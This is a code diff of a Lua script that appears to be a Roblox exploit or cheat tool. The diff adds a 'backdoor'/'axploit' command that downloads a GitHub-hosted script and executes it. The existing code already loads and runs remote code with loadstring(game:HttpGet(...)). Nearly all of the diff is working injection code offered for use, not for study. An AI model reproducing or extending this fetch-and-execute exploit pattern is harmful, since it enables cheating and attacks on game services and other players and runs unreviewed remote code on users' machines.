@@ -21,7 +21,7 @@ _G.Settings = {
 
 local COREGUI = game:GetService("CoreGui")
 -- (62x) - final: 100 (JK)
-local version = "2.4.5" -- reverted version
+local version = "2.4.1" -- reverted version
 
 -- _G.Settings.banwaves
 -- _G.Settings.FreezeFling
@@ -438,7 +438,10 @@ local GroupService = game:GetService("GroupService")
 local Lighting = game:GetService("Lighting")
 local Vortex = loadstring(game:HttpGet("https://raw.githubusercontent.com/Sidhsksjsjsh/Roblox-Vortex-System/main/System.lua"))()
 local Blur = Instance.new("BlurEffect", Lighting)
-Blur.Size = 0 -- 12
+Blur.Size = 0 --12
+local UrlScript = {
+	"https://raw.githubusercontent.com/Sidhsksjsjsh/SHHHHIIIITTTT/main/.lua"
+}
 --[[
 function LyricsMusic(musicname)
 repeat task.wait() until game:IsLoaded()
@@ -9647,6 +9650,12 @@ if cmd == "megahideandseek" or cmd == "mhas" then
 Vortex:CheckError(function()
 	notify("Injecting...","pls wait..")
         executeHTTPS("https://raw.githubusercontent.com/Sidhsksjsjsh/Mega-Hide-And-Seek/main/.lua")
+end)
+end
+if cmd == "backdoor" or cmd == "axploit" then
+Vortex:CheckError(function()
+	notify("Injecting...","pls wait..")
+        executeHTTPS(UrlScript[1])
 end)
 end
 --[[
